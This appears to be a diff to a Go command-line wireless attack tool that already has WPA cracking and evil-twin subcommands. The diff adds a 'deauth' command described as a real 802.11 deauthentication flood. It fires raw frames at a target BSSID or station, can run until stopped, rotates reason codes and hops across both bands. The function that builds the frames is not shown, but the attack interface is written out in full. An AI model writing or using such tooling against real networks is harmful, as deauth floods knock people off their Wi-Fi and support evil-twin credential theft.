@@ -570,6 +570,11 @@ var eviltwinV3Cmd = &cobra.Command{
 
 func init() {
 	crackCmd.Flags().Bool("pmkid-only", false, "skip 4-way (WPA*02) records")
+	deauthCmd.Flags().IntP("count", "n", 0, "Number of frames (0 = run until Ctrl+C)")
+	deauthCmd.Flags().Uint16P("reason", "r", 0, "Reason code (0 = rotate)")
+	deauthCmd.Flags().Bool("hop", false, "Hop channels across 2.4 and 5 GHz")
+	deauthCmd.Flags().Int("hop-delay", 100, "ms per channel when hopping")
+	rootCmd.AddCommand(deauthCmd)
 	rootCmd.AddCommand(crackCmd)
 	rootCmd.AddCommand(modeCmd)
 	rootCmd.AddCommand(auditCmd)
@@ -591,6 +596,33 @@ func init() {
 	eviltwinCmd.AddCommand(eviltwinV1Cmd)
 	eviltwinCmd.AddCommand(eviltwinV2Cmd)
 	eviltwinCmd.AddCommand(eviltwinV3Cmd)
+}
+
+var deauthCmd = &cobra.Command{
+	Use:   "deauth <iface> <bssid> [station]",
+	Short: "Real 802.11 deauthentication flood (dual-band, reason rotation)",
+	Long:  "Fires raw deauth frames over AF_PACKET. --count 0 runs until Ctrl+C; --hop rotates 2.4+5GHz; --reason 0 rotates reason codes.",
+	Args:  cobra.RangeArgs(2, 3),
+	Run: func(cmd *cobra.Command, args []string) {
+		iface := args[0]
+		bssid := args[1]
+		station := ""
+		if len(args) >= 3 {
+			station = args[2]
+		}
+		count, _ := cmd.Flags().GetInt("count")
+		reason16, _ := cmd.Flags().GetUint16("reason")
+		hop, _ := cmd.Flags().GetBool("hop")
+		hopDelay, _ := cmd.Flags().GetInt("hop-delay")
+		err := runDeauthEngine(deauthEngineOpts{
+			Iface: iface, BSSID: bssid, Station: station,
+			Count: count, Reason: reason16, Hop: hop, HopDelay: hopDelay,
+		})
+		if err != nil {
+			fmt.Printf("[-] deauth failed: %v\n", err)
+			os.Exit(1)
+		}
+	},
 }
 
 func main() {
